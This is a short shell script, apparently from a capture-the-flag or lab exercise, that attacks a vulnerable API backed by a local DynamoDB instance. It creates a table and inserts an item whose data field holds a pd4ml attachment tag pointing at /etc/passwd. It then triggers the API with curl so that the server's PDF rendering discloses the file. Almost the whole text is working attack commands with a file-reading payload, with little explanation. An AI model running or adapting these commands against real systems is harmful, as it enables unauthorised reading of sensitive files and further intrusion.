# Exploits a vulnerable api to execute AFI against dynamodb 

# Create a table read by a server's script
aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566 

# Puts an item that exposes vulnerable api as attachment (pd4ml)
aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment src=\"/etc/passwd\" description=\"Sensitive File\" icon=\"Tag\">"}}' --endpoint-url http://127.0.0.1:4566

# On attacker terminal, call vulnerable api exposed on port 8000 : 
curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v
